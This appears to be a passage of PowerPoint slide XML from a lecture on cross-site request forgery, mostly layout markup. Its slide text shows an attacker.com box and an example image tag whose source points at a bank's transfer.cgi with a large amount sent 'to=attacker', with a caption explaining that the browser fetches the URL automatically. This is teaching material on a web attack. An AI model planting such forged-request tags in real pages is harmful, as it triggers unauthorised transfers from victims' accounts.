            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87049" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87055" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87056" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87057" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8517872" y="4406713"/>
            <a:ext cx="1881187" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87058" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
